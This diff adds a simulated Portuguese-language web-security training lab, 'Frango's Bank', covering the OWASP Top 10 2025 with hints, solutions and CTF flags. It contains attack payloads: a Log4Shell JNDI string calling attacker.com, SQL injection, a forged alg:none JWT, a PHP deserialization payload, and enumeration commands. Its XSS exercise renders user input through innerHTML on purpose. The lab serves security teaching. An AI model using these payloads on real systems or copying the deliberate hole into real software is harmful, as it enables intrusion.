@@ -1,0 +1,769 @@
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',sans-serif}
+.hidden{display:none!important}
+body{background:#1a1a2e;color:#eee}
+.topbar{background:#cc2200;color:#fff;padding:8px 24px;display:flex;justify-content:space-between;align-items:center;font-size:12px}
+.navbar{background:#a81900;padding:0 20px;display:flex;align-items:center;height:56px;gap:16px}
+.logo{display:flex;align-items:center;gap:8px;color:#fff;font-weight:700;font-size:16px}
+.logo-sub{color:#ffcc88;font-size:9px;letter-spacing:1px;display:block}
+.diff-bar{margin-left:auto;display:flex;gap:8px;align-items:center}
+.diff-btn{padding:6px 14px;border:1px solid rgba(255,255,255,.3);background:transparent;color:#fff;border-radius:4px;font-size:12px;cursor:pointer;transition:all .2s}
+.diff-btn.active{background:#ffcc00;color:#333;border-color:#ffcc00;font-weight:700}
+.lab-badge{background:#ff4444;color:#fff;font-size:10px;padding:3px 8px;border-radius:3px;font-weight:700;letter-spacing:1px}
+.main{display:flex;min-height:560px}
+.sidebar{width:230px;background:#16213e;padding:16px 0;flex-shrink:0}
+.sidebar-title{font-size:10px;color:#888;text-transform:uppercase;letter-spacing:1px;padding:0 16px 8px}
+.sidebar-item{padding:10px 16px;cursor:pointer;font-size:12px;color:#aaa;border-left:3px solid transparent;transition:all .2s;display:flex;align-items:center;gap:8px}
+.sidebar-item:hover{background:rgba(255,255,255,.05);color:#fff}
+.sidebar-item.active{background:rgba(204,34,0,.2);color:#ff6644;border-left-color:#cc2200}
+.sidebar-item .vuln-id{font-size:10px;background:rgba(255,100,0,.2);color:#ff6644;padding:2px 5px;border-radius:3px;font-weight:700;flex-shrink:0}
+.sidebar-item.done .vuln-id{background:rgba(0,180,0,.2);color:#00cc44}
+.content{flex:1;padding:24px;overflow-y:auto;background:#0f0f23}
+.vuln-title{font-size:20px;font-weight:700;color:#fff;margin-bottom:4px}
+.vuln-owasp{font-size:12px;color:#ff6644;font-weight:600;margin-bottom:12px}
+.vuln-desc{font-size:13px;color:#aaa;line-height:1.7;margin-bottom:20px}
+.tabs{display:flex;gap:0;border-bottom:1px solid #333;margin-bottom:20px}
+.tab{padding:8px 18px;font-size:13px;cursor:pointer;color:#888;border-bottom:2px solid transparent;transition:all .2s}
+.tab:hover{color:#fff}
+.tab.active{color:#ff6644;border-bottom-color:#cc2200}
+.lab-box{background:#1a1a2e;border:1px solid #333;border-radius:8px;padding:20px;margin-bottom:16px}
+.lab-box h4{font-size:13px;font-weight:600;color:#ffcc00;margin-bottom:12px}
+.lab-input{width:100%;padding:9px 12px;background:#0f0f23;border:1px solid #444;border-radius:5px;color:#fff;font-size:13px;outline:none;font-family:'Courier New',monospace;margin-bottom:8px}
+.lab-input:focus{border-color:#cc2200}
+.lab-btn{padding:9px 20px;background:#cc2200;color:#fff;border:none;border-radius:5px;font-size:13px;font-weight:600;cursor:pointer;margin-right:8px;margin-top:4px;transition:background .2s}
+.lab-btn:hover{background:#a81900}
+.lab-btn.sec{background:#0f4c75}
+.lab-btn.sec:hover{background:#1b6ca8}
+.output-box{background:#000;border:1px solid #333;border-radius:5px;padding:14px;font-family:'Courier New',monospace;font-size:12px;color:#00ff41;min-height:60px;margin-top:12px;white-space:pre-wrap;word-break:break-all}
+.hint-box{background:#1a2a1a;border:1px solid #2d4a2d;border-radius:5px;padding:12px;font-size:12px;color:#88cc88;margin-top:10px;line-height:1.6}
+.solution-box{background:#1a1a00;border:1px solid #4a4a00;border-radius:5px;padding:14px;font-size:12px;color:#cccc00;margin-top:10px;line-height:1.8;font-family:'Courier New',monospace;white-space:pre-wrap}
+.info-card{background:#16213e;border-radius:8px;padding:16px;margin-bottom:12px}
+.info-card h5{font-size:12px;color:#ff6644;margin-bottom:8px;text-transform:uppercase;letter-spacing:.5px}
+.info-card p{font-size:13px;color:#aaa;line-height:1.6}
+.tag{display:inline-block;padding:2px 8px;border-radius:3px;font-size:11px;font-weight:600;margin-right:4px}
+.tag.crit{background:rgba(255,0,0,.2);color:#ff5555}
+.tag.high{background:rgba(255,100,0,.2);color:#ff8800}
+.tag.med{background:rgba(255,200,0,.2);color:#ffcc00}
+.tag.low{background:rgba(0,200,100,.2);color:#00cc66}
+.progress-bar{background:#333;border-radius:3px;height:6px;margin-top:6px}
+.progress-fill{background:linear-gradient(90deg,#cc2200,#ff6600);height:6px;border-radius:3px;transition:width .5s}
+.score-badge{background:#ffcc00;color:#333;font-size:11px;font-weight:700;padding:4px 12px;border-radius:12px}
+.flag{background:#1a0000;border:1px solid #cc2200;color:#ff4444;font-family:'Courier New',monospace;font-size:13px;padding:10px 16px;border-radius:5px;display:inline-block;margin-top:10px;letter-spacing:1px;width:100%}
+</style>
+
+<div style="background:#1a1a2e;min-height:620px">
+<div class="topbar">
+  <span>🐥 Frango's Bank — <span class="lab-badge">DVWA LAB</span> — OWASP Top 10 <b>2025</b> — Ambiente isolado educacional</span>
+  <span>Score: <span class="score-badge" id="score-badge">0 / 1000 pts</span></span>
+</div>
+<div class="navbar">
+  <div class="logo">
+    <span style="font-size:24px">🐥</span>
+    <div><div>Frango's Bank</div><span class="logo-sub">GALINHEIRO HALL — DVWA 2025</span></div>
+  </div>
+  <div class="diff-bar">
+    <span style="font-size:12px;color:#ffcc88">Dificuldade:</span>
+    <button class="diff-btn active" onclick="setDiff('low',this)">Fácil</button>
+    <button class="diff-btn" onclick="setDiff('med',this)">Médio</button>
+    <button class="diff-btn" onclick="setDiff('high',this)">Difícil</button>
+  </div>
+</div>
+
+<div class="main">
+  <div class="sidebar">
+    <div class="sidebar-title">OWASP Top 10 — 2025</div>
+    <div class="sidebar-item active" id="si-a01" onclick="loadVuln('a01',this)"><span class="vuln-id">A01</span>Broken Access Control</div>
+    <div class="sidebar-item" id="si-a02" onclick="loadVuln('a02',this)"><span class="vuln-id">A02</span>Security Misconfiguration</div>
+    <div class="sidebar-item" id="si-a03" onclick="loadVuln('a03',this)"><span class="vuln-id">A03</span>Supply Chain Failures</div>
+    <div class="sidebar-item" id="si-a04" onclick="loadVuln('a04',this)"><span class="vuln-id">A04</span>Cryptographic Failures</div>
+    <div class="sidebar-item" id="si-a05" onclick="loadVuln('a05',this)"><span class="vuln-id">A05</span>Injection</div>
+    <div class="sidebar-item" id="si-a06" onclick="loadVuln('a06',this)"><span class="vuln-id">A06</span>Insecure Design</div>
+    <div class="sidebar-item" id="si-a07" onclick="loadVuln('a07',this)"><span class="vuln-id">A07</span>Authentication Failures</div>
+    <div class="sidebar-item" id="si-a08" onclick="loadVuln('a08',this)"><span class="vuln-id">A08</span>Integrity Failures</div>
+    <div class="sidebar-item" id="si-a09" onclick="loadVuln('a09',this)"><span class="vuln-id">A09</span>Logging &amp; Alerting</div>
+    <div class="sidebar-item" id="si-a10" onclick="loadVuln('a10',this)"><span class="vuln-id">A10</span>Exceptional Conditions</div>
+    <div style="padding:16px;margin-top:8px;border-top:1px solid #333">
+      <div style="font-size:10px;color:#888;margin-bottom:6px">PROGRESSO</div>
+      <div style="font-size:12px;color:#aaa" id="progress-text">0 / 10 desafios</div>
+      <div class="progress-bar"><div class="progress-fill" id="progress-fill" style="width:0%"></div></div>
+    </div>
+  </div>
+  <div class="content" id="content"></div>
+</div>
+</div>
+
+<script>
+let difficulty='low', score=0, solved=new Set();
+
+function setDiff(d,btn){
+  difficulty=d;
+  document.querySelectorAll('.diff-btn').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  const cur=document.querySelector('.sidebar-item.active');
+  if(cur) cur.click();
+}
+
+function loadVuln(id,el){
+  document.querySelectorAll('.sidebar-item').forEach(i=>i.classList.remove('active'));
+  el.classList.add('active');
+  document.getElementById('content').innerHTML=VULNS[id]?VULNS[id]():'';
+}
+
+function showTab(tabId,group){
+  document.querySelectorAll('[data-group="'+group+'"]').forEach(t=>{
+    document.getElementById(t.dataset.target)?.classList.add('hidden');
+    t.classList.remove('active');
+  });
+  document.getElementById(tabId)?.classList.remove('hidden');
+  event.target.classList.add('active');
+}
+
+function addScore(id,pts){
+  if(!solved.has(id)){
+    solved.add(id);
+    score+=pts;
+    document.getElementById('score-badge').textContent=score+' / 1000 pts';
+    document.getElementById('progress-text').textContent=solved.size+' / 10 desafios';
+    document.getElementById('progress-fill').style.width=(solved.size*10)+'%';
+    document.getElementById('si-'+id)?.querySelector('.vuln-id')?.parentElement?.classList.add('done');
+  }
+}
+
+function tabs(id,labels){
+  return `<div class="tabs">${labels.map((l,i)=>`<button class="tab${i===0?' active':''}" data-group="${id}t" data-target="${id}-${['lab','info','sol'][i]}" onclick="showTab('${id}-${['lab','info','sol'][i]}','${id}t')">${l}</button>`).join('')}</div>`;
+}
+
+// ══════════════════════════════════════════════
+// A01 — BROKEN ACCESS CONTROL
+// ══════════════════════════════════════════════
+const ACCOUNTS={1001:{name:"Cornélio Pinto",cpf:"123.456.789-00",bal:"🌽 18.430,00",email:"cornelio@frangosbank.com",role:"user"},1002:{name:"Maria Galinha",cpf:"987.654.321-00",bal:"🌽 3.200,00",email:"maria@email.com",role:"user"},1003:{name:"João Pintinho",cpf:"111.222.333-44",bal:"🌽 750,00",email:"joao@email.com",role:"user"},1004:{name:"Ana Carijó",cpf:"555.444.333-22",bal:"🌽 45.000,00",email:"ana@email.com",role:"user"},1005:{name:"Admin Galinheiro",cpf:"000.000.000-00",bal:"🌽 999.999,00",email:"admin@frangosbank.com",role:"admin"}};
+
+function a01go(){
+  const id=parseInt(document.getElementById('a01i').value)||1001;
+  const a=ACCOUNTS[id];
+  if(!a){document.getElementById('a01o').textContent='HTTP 404 Not Found\n{"error":"Account not found"}';return;}
+  const own=id===1001;
+  document.getElementById('a01o').textContent=`HTTP/1.1 200 OK\n\n{\n  "account_id": ${id},\n  "name": "${a.name}",\n  "cpf": "${a.cpf}",\n  "email": "${a.email}",\n  "balance": "${a.bal}",\n  "role": "${a.role}"\n}\n\n${own?'[OK] Acesso à própria conta.':'[⚠️ IDOR] Acesso à conta de outro usuário sem autorização!'}`;
+  if(!own) addScore('a01',100);
+}
+
+// ══════════════════════════════════════════════
+// A02 — SECURITY MISCONFIGURATION
+// ══════════════════════════════════════════════
+function a02go(endpoint){
+  const responses={
+    headers:`HTTP/1.1 200 OK\nServer: Apache/2.2.8 (Ubuntu)\nX-Powered-By: PHP/5.6.0\nX-AspNet-Version: 4.0.30319\nAccess-Control-Allow-Origin: *\n\n[⚠️ MISCONFIG] Headers revelam stack completo!\n\nAusentes (obrigatórios):\n  ✗ Content-Security-Policy\n  ✗ X-Frame-Options\n  ✗ Strict-Transport-Security\n  ✗ X-Content-Type-Options\n  ✗ Referrer-Policy`,
+    admin:`HTTP/1.1 200 OK\n\n<title>Admin Panel — Frango's Bank</title>\n<!-- Sem autenticação! -->\n<form action="/admin/exec">\n  Executar SQL: <input name="query"/>\n</form>\n\n[⚠️ MISCONFIG] Painel admin acessível sem login!`,
+    env:`HTTP/1.1 200 OK\n\nDB_HOST=10.0.0.5\nDB_USER=root\nDB_PASS=galinha123\nDB_NAME=frangosbank_prod\nJWT_SECRET=frango_jwt_2024\nAWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET=wJalrXUtnFEMI/K7MDENG/bPxRfi\nPIX_SECRET=pix_prod_key_xyz\n\n[⚠️ MISCONFIG] .env exposto com credenciais de produção!`,
+    backup:`HTTP/1.1 200 OK\nContent-Type: application/sql\n\n-- Frango's Bank DB Backup 2026-04-17\nINSERT INTO tb_usuarios VALUES\n(1,'cornelio@frangosbank.com','senha123','123.456.789-00',18430),\n(2,'admin@frangosbank.com','admin','000.000.000-00',999999);\n\n[⚠️ MISCONFIG] Backup SQL público com senhas em texto claro!`,
+  };
+  document.getElementById('a02o').textContent=responses[endpoint]||'';
+  addScore('a02',100);
+}
+
+// ══════════════════════════════════════════════
+// A03 — SOFTWARE SUPPLY CHAIN FAILURES
+// ══════════════════════════════════════════════
+const CVE_DB={
+  'log4j 2.14':`CVE-2021-44228 — Log4Shell\nCVSS: 10.0 CRÍTICO\nImpacto: RCE via JNDI lookup em campos logados\nPayload: \${jndi:ldap://attacker.com/exploit}\nFix: atualizar para Log4j 2.17.1+`,
+  'jquery 1.6':`CVE-2019-11358 — Prototype Pollution\nCVSS: 6.1 MÉDIO\nCVE-2015-9251 — XSS via crossDomain\nFix: jQuery 3.7.0+`,
+  'spring 2.5':`CVE-2022-22965 — Spring4Shell\nCVSS: 9.8 CRÍTICO\nImpacto: RCE via DataBinder em JDK 9+\nFix: Spring Boot 2.6.6 / 2.5.12+`,
+  'openssl 1.0':`CVE-2014-0160 — Heartbleed\nCVSS: 7.5 ALTO\nImpacto: Vazamento de memória heap, chaves privadas\nFix: OpenSSL 1.0.1g+`,
+  'struts 2.3':`CVE-2017-5638 — Apache Struts RCE\nCVSS: 10.0 CRÍTICO\nImpacto: RCE via Content-Type header\n(Explorado no hack da Equifax 2017)\nFix: Struts 2.3.32+`,
+};
+function a03go(){
+  const q=document.getElementById('a03i').value.toLowerCase().trim();
+  let found=false;
+  for(const [k,v] of Object.entries(CVE_DB)){
+    if(q.includes(k.split(' ')[0])&&q.includes(k.split(' ')[1])){
+      document.getElementById('a03o').textContent=`[NVD/MITRE] Componente: ${k}\n\n${v}`;
+      addScore('a03',100); found=true; break;
+    }
+  }
+  if(!found) document.getElementById('a03o').textContent=`Nenhum CVE encontrado.\nTente: "log4j 2.14", "spring 2.5", "jquery 1.6", "openssl 1.0", "struts 2.3"`;
+}
+function a03scan(){
+  document.getElementById('a03o').textContent=`[dependency-check] Escaneando /app/WEB-INF/lib/...\n\nENCONTRADO: log4j-core-2.14.0.jar\n  → CVE-2021-44228 (CVSS 10.0) LOG4SHELL\n\nENCONTRADO: jquery-1.6.1.min.js\n  → CVE-2019-11358 (CVSS 6.1)\n\nENCONTRADO: spring-boot-2.5.0.jar\n  → CVE-2022-22965 (CVSS 9.8) SPRING4SHELL\n\nENCONTRADO: commons-collections-3.1.jar\n  → CVE-2015-7501 (CVSS 9.8) Desserialização RCE\n\n[⚠️ 4 vulnerabilidades críticas encontradas!]`;
+  addScore('a03',100);
+}
+
+// ══════════════════════════════════════════════
+// A04 — CRYPTOGRAPHIC FAILURES
+// ══════════════════════════════════════════════
+function a04decode(){
+  const v=document.getElementById('a04i').value.trim();
+  try{
+    const d=atob(v);
+    document.getElementById('a04o').textContent=`Decodificado: ${d}\n\n[⚠️ CRYPTO FAILURE] Dados sensíveis em Base64!\nBase64 NÃO é criptografia — qualquer pessoa decodifica.\nConteúdo exposto: ${d}`;
+    addScore('a04',50);
+  }catch(e){
+    document.getElementById('a04o').textContent='Base64 inválido.\nTente: dXNlcjpjb3JuZWxpbzpzZW5oYTEyMw==';
+  }
+}
+function a04cookie(){
+  document.getElementById('a04o').textContent=`Cookie analisado:\nauth_token=eyJ1c2VyIjoiY29ybmVsaW8iLCJyb2xlIjoidXNlciJ9\n\nDecodificando payload JWT:\n→ {"user":"cornelio","role":"user"}\n\n[⚠️ CRYPTO FAILURE]\n  - JWT sem assinatura verificada (alg: none)\n  - Payload em Base64 simples — legível por qualquer um\n  - Altere role para "admin" e reencodeie!\n\nCookie flags ausentes:\n  ✗ Secure\n  ✗ HttpOnly\n  ✗ SameSite`;
+  addScore('a04',100);
+}
+
+// ══════════════════════════════════════════════
+// A05 — INJECTION
+// ══════════════════════════════════════════════
+function a05sqli(){
+  const u=document.getElementById('a05u').value;
+  const p=document.getElementById('a05p').value;
+  const attack=u.includes("'")||u.includes('--')||u.includes('OR')||u.toLowerCase().includes(' or ');
+  document.getElementById('a05o').textContent=attack
+    ?`[QUERY] SELECT * FROM users WHERE user='${u}' AND pass='${p}'\n\n[✅ BYPASS!] O comentário (--) anulou a verificação de senha!\nLogado como: admin@frangosbank.com\nRole: ADMINISTRATOR\n\n[⚠️ SQL INJECTION — CWE-89]`
+    :`[QUERY] SELECT * FROM users WHERE user='${u}' AND pass='${p}'\n\nHTTP 401 Unauthorized\n{"error":"Credenciais inválidas"}\n\nDica (fácil): tente admin'-- no campo usuário`;
+  if(attack) addScore('a05',50);
+}
+function a05xss(){
+  const i=document.getElementById('a05x').value;
+  const out=document.getElementById('a05xo');
+  if(i.includes('<')){
+    out.innerHTML='<div style="color:#aaa;font-size:12px;margin-bottom:6px">Resultado (HTML renderizado sem sanitização):</div>'+i;
+    addScore('a05',50);
+  } else {
+    out.textContent='Sem resultados para: '+i;
+  }
+}
+
+// ══════════════════════════════════════════════
+// A06 — INSECURE DESIGN
+// ══════════════════════════════════════════════
+function a06race(){
+  const val=parseFloat(document.getElementById('a06v').value)||500;
+  const n=parseInt(document.getElementById('a06n').value)||2;
+  let out=`[RACE CONDITION] Disparando ${n} threads simultâneas...\nSaldo disponível: 🌽 ${val.toFixed(2)}\n\n`;
+  for(let i=1;i<=n;i++) out+=`[Thread ${i}] Leu saldo: 🌽 ${val.toFixed(2)} → APROVADO\n`;
+  out+='\n';
+  for(let i=1;i<=n;i++) out+=`[Thread ${i}] DEBITANDO 🌽 ${val.toFixed(2)}... OK\n`;
+  out+=`\nSaldo final: 🌽 ${(val-val*n).toFixed(2)}`;
+  if(n>=2) out+=`\n\n[⚠️ RACE CONDITION] Saldo negativo! Sem lock atômico!\nDebitado: 🌽 ${(val*n).toFixed(2)} com apenas 🌽 ${val.toFixed(2)} disponíveis.`;
+  document.getElementById('a06o').textContent=out;
+  if(n>=2) addScore('a06',50);
+}
+function a06neg(){
+  const v=parseFloat(document.getElementById('a06neg').value)||0;
+  if(v<0){
+    document.getElementById('a06o').textContent=`POST /api/transfer {"amount":${v}}\n\n[SERVER] Validação: saldo >= ${v}? → TRUE (qualquer número >= negativo)\n[SERVER] Debitando ${v}...\n[SERVER] Resultado: saldo aumentou em 🌽 ${Math.abs(v).toFixed(2)}!\n\n[⚠️ INSECURE DESIGN] Valor negativo aceito! Lógica de negócio quebrada.`;
+    addScore('a06',50);
+  } else {
+    document.getElementById('a06o').textContent='Digite um valor negativo, ex: -1000';
+  }
+}
+
+// ══════════════════════════════════════════════
+// A07 — AUTHENTICATION FAILURES
+// ══════════════════════════════════════════════
+const PWLIST=['123456','password','admin','letmein','qwerty','abc123','frango123','galinha','milho','1234567','master','sunshine','admin123'];
+function a07brute(){
+  const user=document.getElementById('a07u').value;
+  const target='admin';
+  let out=`[HYDRA] Alvo: ${user}\n[HYDRA] Sem rate limiting — sem CAPTCHA — sem lockout!\n\n`;
+  PWLIST.forEach((w,i)=>{
+    out+=`[${String(i+1).padStart(2,'0')}] ${w.padEnd(12)} → ${w===target?'✅ ENCONTRADA!':'❌'}\n`;
+  });
+  out+=`\n[✅] Credencial válida: ${user} : ${target}\n[⚠️ AUTH FAILURE] ${PWLIST.length} tentativas sem bloqueio!`;
+  document.getElementById('a07o').textContent=out;
+  addScore('a07',100);
+}
+function a07session(){
+  const tokens=['dXNlcjoxNzQ1OTk5MDAwOjEwMDE=','dXNlcjoxNzQ1OTk5MDYwOjEwMDE=','dXNlcjoxNzQ1OTk5MTIwOjEwMDE='];
+  let out='[ANÁLISE DE TOKENS]\n\n';
+  tokens.forEach((t,i)=>{
+    const d=atob(t);
+    out+=`Token ${i+1}: ${t}\nDecodificado: ${d}\n\n`;
+  });
+  out+='[⚠️ AUTH FAILURE] Token = base64(user:timestamp:accountId)\nPrevisível! Incremente o timestamp para forjar sessões.';
+  document.getElementById('a07o').textContent=out;
+  addScore('a07',100);
+}
+
+// ══════════════════════════════════════════════
+// A08 — INTEGRITY FAILURES
+// ══════════════════════════════════════════════
+function a08jwt(){
+  const payload=document.getElementById('a08i').value||'{"user":"cornelio","role":"admin","exp":9999999999}';
+  try{
+    const h=btoa('{"alg":"none","typ":"JWT"}').replace(/=+$/,'');
+    const p=btoa(payload).replace(/=+$/,'');
+    document.getElementById('a08o').textContent=`[JWT FORJADO — alg:none]\n\nToken: ${h}.${p}.\n\nHeader: {"alg":"none","typ":"JWT"}\nPayload: ${payload}\nAssinatura: (vazia)\n\nUso: Authorization: Bearer ${h}.${p}.\n\n[⚠️ INTEGRITY FAILURE] Servidor aceitou token sem assinatura!\nRole escalada para: admin`;
+    addScore('a08',100);
+  }catch(e){
+    document.getElementById('a08o').textContent='JSON inválido no payload.';
+  }
+}
+function a08deserial(){
+  document.getElementById('a08o').textContent=`[DESERIALIZAÇÃO INSEGURA]\n\nPayload PHP serializado malicioso:\nO:8:"UserPref":2:{s:4:"theme";s:4:"dark";s:4:"exec";s:6:"whoami";}\n\n[SERVER] Desserializando objeto recebido do cookie...\n[SERVER] Executando magic method __wakeup()...\n[SERVER] Resultado: root\n\n[⚠️ INTEGRITY FAILURE] RCE via deserialização PHP!\nCWE-502: Deserialization of Untrusted Data`;
+  addScore('a08',100);
+}
+
+// ══════════════════════════════════════════════
+// A09 — LOGGING & ALERTING FAILURES
+// ══════════════════════════════════════════════
+function a09go(t){
+  const r={
+    logs:`HTTP/1.1 200 OK — /logs/app.log\n\n[2026-04-17 08:14:22] LOGIN user=cornelio pass=senha123 ip=187.x.x.x ← SENHA LOGADA!\n[2026-04-17 08:14:23] SESSION token=eyJhbGciOiJIUzI... user=cornelio ← TOKEN LOGADO!\n[2026-04-17 08:10:11] FAILED user=admin pass=admin123\n[2026-04-17 08:10:12] FAILED user=admin pass=senha123\n[2026-04-17 08:10:13] FAILED user=admin pass=qwerty\n... (97 tentativas falhas)\n[2026-04-17 08:11:55] LOGIN user=admin pass=admin ← SEM ALERTA!\n[2026-04-17 07:55:01] SQL ERROR: syntax near ''' at UserDAO.java:42\n\n[⚠️ LOGGING FAILURE]\n  - Senhas logadas em texto claro\n  - 100 falhas sem alerta/bloqueio\n  - Stack traces com estrutura interna`,
+    noalert:`[SIMULAÇÃO] Tentativas de login para admin@frangosbank.com:\n\n001-100: Falhas de senha → NENHUM ALERTA GERADO\n101-500: Falhas → NENHUM ALERTA\n501-999: Falhas → NENHUM ALERTA\n1000: ✅ SENHA ENCONTRADA (admin)\n\nTempo total: 4 minutos\nAlertas enviados: 0\nIPs bloqueados: 0\nNotificações: 0\n\n[⚠️ ALERTING FAILURE] Ataque de brute force completo sem detecção!`,
+    inject:`[LOG INJECTION]\n\nInput do atacante no campo de login:\nmalicia\\n[2026-04-17 09:00:00] LOGIN admin SUCESSO ip=127.0.0.1\n\nLog resultante:\n[2026-04-17 08:59:59] FAILED user=malicia\n[2026-04-17 09:00:00] LOGIN admin SUCESSO ip=127.0.0.1 ← FALSA!\n\n[⚠️ LOG INJECTION] Atacante inseriu evento falso no log!\nCWE-117: Improper Output Neutralization for Logs`,
+  };
+  document.getElementById('a09o').textContent=r[t]||'';
+  addScore('a09',100);
+}
+
+// ══════════════════════════════════════════════
+// A10 — MISHANDLING OF EXCEPTIONAL CONDITIONS
+// ══════════════════════════════════════════════
+function a10go(t){
+  const r={
+    stacktrace:`HTTP/1.1 500 Internal Server Error\n\njava.sql.SQLException: You have an error in your SQL syntax\nnear '''' at line 1\n  at com.frangosbank.dao.UserDAO.findByUsername(UserDAO.java:42)\n  at com.frangosbank.service.AuthService.login(AuthService.java:28)\n  at com.frangosbank.controller.LoginController.doPost(LoginController.java:15)\n  at org.apache.catalina.core.ApplicationFilterChain...\n\nDatabase: MySQL 5.6.0 @ 10.0.0.5:3306\nSchema: frangosbank_prod\nTabela: tb_usuarios\nQuery: SELECT * FROM tb_usuarios WHERE email=...\n\n[⚠️ EXCEPTIONAL CONDITIONS]\nStack trace expõe: linguagem, versão, IP interno,\nnome do schema, estrutura de classes — mapa para o atacante!`,
+    overflow:`[TESTE: Valor extremo na transferência]\n\nPOST /api/transfer {"amount": 99999999999999999999}\n\nERRO não tratado:\nArithmeticException: BigDecimal overflow at TransferService.java:89\nStack: [TransferService, AccountDAO, MySQLConnector...]\n\nPOST /api/transfer {"amount": null}\nNullPointerException: Cannot invoke method doubleValue() on null\nat TransferService.java:76\n\n[⚠️ EXCEPTIONAL CONDITIONS]\nErros não tratados revelam estrutura interna\ne podem causar comportamento inesperado (bypass de validações)`,
+    type:`[TESTE: Type confusion]\n\nPOST /api/transfer {"amount": "1000abc"}\n[SERVER] parseFloat("1000abc") → 1000 (JavaScript!)\n[SERVER] Transferência de 🌽 1000 processada sem erro!\n\nPOST /api/transfer {"amount": true}\n[SERVER] true → 1 em alguns contextos\n[SERVER] Transferência de 🌽 1 processada\n\n[⚠️ EXCEPTIONAL CONDITIONS]\nCoerção de tipos não tratada pode bypassar validações\nCWE-704: Incorrect Type Conversion`,
+  };
+  document.getElementById('a10o').textContent=r[t]||'';
+  addScore('a10',100);
+}
+
+// ══════════════════════════════════════════════
+// DEFINIÇÃO DOS DESAFIOS
+// ══════════════════════════════════════════════
+const VULNS={
+a01:()=>`
+<div class="vuln-title">A01 — Broken Access Control</div>
+<div class="vuln-owasp">OWASP 2025 #1 &nbsp;|&nbsp; <span class="tag crit">CRÍTICO</span> &nbsp;|&nbsp; CWE-284, 285, 639</div>
+<div class="vuln-desc">Usuários acessam recursos além de suas permissões. IDOR, escalada de privilégio, manipulação de parâmetros.</div>
+${tabs('a01',['🧪 Laboratório','📖 Teoria','🚩 Solução'])}
+<div id="a01-lab">
+  <div class="lab-box">
+    <h4>🎯 IDOR — Acesse a conta de outro usuário via account_id</h4>
+    <div style="font-size:12px;color:#aaa;margin-bottom:10px">Você é Cornélio (id=1001). O endpoint não verifica se a conta pertence a você.</div>
+    <label style="font-size:12px;color:#aaa">GET /api/v1/account/<b>?id=</b></label>
+    <input class="lab-input" id="a01i" type="number" value="1001" style="width:120px;display:inline-block;margin-left:8px"/>
+    <button class="lab-btn" onclick="a01go()">Enviar requisição</button>
+    <div class="output-box" id="a01o">// Aguardando...</div>
+    ${difficulty==='low'?'<div class="hint-box">💡 Dica: Tente IDs entre 1002 e 1005. O servidor retorna dados de qualquer conta sem verificar o dono.</div>':''}
+  </div>
+</div>
+<div id="a01-info" class="hidden">
+  <div class="info-card"><h5>O que é IDOR?</h5><p>Insecure Direct Object Reference — a aplicação usa IDs controláveis pelo usuário para acessar objetos diretamente sem verificar autorização server-side.</p></div>
+  <div class="info-card"><h5>Outros vetores A01</h5><p>Forçar navegação para /admin, modificar cookies de role, acessar API endpoints de outros usuários, escalar de user para admin via parâmetro.</p></div>
+  <div class="info-card"><h5>Correção</h5><p>Sempre validar server-side: "o usuário autenticado é dono deste recurso?". Nunca confiar em IDs vindos do cliente sem verificação de propriedade.</p></div>
+</div>
+<div id="a01-sol" class="hidden">
+  <div class="solution-box">GET /api/v1/account?id=1002  (sua conta é 1001)
+GET /api/v1/account?id=1005  (admin)
+
+# Iterar com ffuf:
+ffuf -u https://target/api/v1/account?id=FUZZ \\
+     -w numbers.txt -H "Auth: Bearer TOKEN"
+
+# Burp — Autorize plugin:
+# Compara respostas autenticado vs não-autenticado</div>
+  <div class="flag" id="a01-flag" style="display:none">🚩 FLAG{A01_FRANGO_IDOR_GALINHEIRO_2025}</div>
+  <button class="lab-btn" style="margin-top:12px" onclick="document.getElementById('a01-flag').style.display='block';addScore('a01',100)">Revelar flag (+100 pts)</button>
+</div>`,
+
+a02:()=>`
+<div class="vuln-title">A02 — Security Misconfiguration</div>
+<div class="vuln-owasp">OWASP 2025 #2 &nbsp;|&nbsp; <span class="tag high">ALTO</span> &nbsp;|&nbsp; CWE-2, 16, 388</div>
+<div class="vuln-desc">Configurações padrão inseguras, headers ausentes, diretórios expostos, painéis sem proteção, CORS aberto, mensagens de erro verbosas.</div>
+${tabs('a02',['🧪 Laboratório','📖 Teoria','🚩 Solução'])}
+<div id="a02-lab">
+  <div class="lab-box">
+    <h4>🎯 Descubra endpoints e configurações expostas</h4>
+    <button class="lab-btn" onclick="a02go('headers')">GET / — Headers HTTP</button>
+    <button class="lab-btn sec" onclick="a02go('admin')">GET /admin</button>
+    <button class="lab-btn sec" onclick="a02go('env')">GET /.env</button>
+    <button class="lab-btn sec" onclick="a02go('backup')">GET /backup.sql</button>
+    <div class="output-box" id="a02o">// Selecione um endpoint...</div>
+    ${difficulty==='low'?'<div class="hint-box">💡 Dica: Comece pelos headers. Ferramentas como gobuster e dirsearch automatizam a busca de arquivos expostos.</div>':''}
+  </div>
+</div>
+<div id="a02-info" class="hidden">
+  <div class="info-card"><h5>Misconfigurações comuns</h5><p>Server/X-Powered-By revelando versões, /phpinfo.php, /.git exposto, CORS *, debug mode em produção, senhas padrão não alteradas.</p></div>
+  <div class="info-card"><h5>Headers obrigatórios</h5><p>Content-Security-Policy, X-Frame-Options: DENY, Strict-Transport-Security, X-Content-Type-Options: nosniff, Referrer-Policy.</p></div>
+  <div class="info-card"><h5>Ferramentas</h5><p>nikto, gobuster, dirsearch, nuclei, securityheaders.com para análise de headers.</p></div>
+</div>
+<div id="a02-sol" class="hidden">
+  <div class="solution-box">nikto -h https://target.com
+gobuster dir -u https://target -w common.txt
+dirsearch -u https://target -e env,sql,bak,git,php
+
+# Endpoints críticos:
+/.env  /.git/config  /backup.sql  /admin
+/phpinfo.php  /swagger.json  /actuator</div>
+  <div class="flag" id="a02-flag" style="display:none">🚩 FLAG{A02_FRANGO_MISCONFIG_ENV_EXPOSTO}</div>
+  <button class="lab-btn" style="margin-top:12px" onclick="document.getElementById('a02-flag').style.display='block';addScore('a02',100)">Revelar flag (+100 pts)</button>
+</div>`,
+
+a03:()=>`
+<div class="vuln-title">A03 — Software Supply Chain Failures</div>
+<div class="vuln-owasp">OWASP 2025 #3 &nbsp;|&nbsp; <span class="tag crit">CRÍTICO</span> &nbsp;|&nbsp; CWE-937, 1035</div>
+<div class="vuln-desc">Dependências desatualizadas com CVEs conhecidos, bibliotecas maliciosas, pipelines CI/CD sem verificação de integridade, typosquatting em npm/pip.</div>
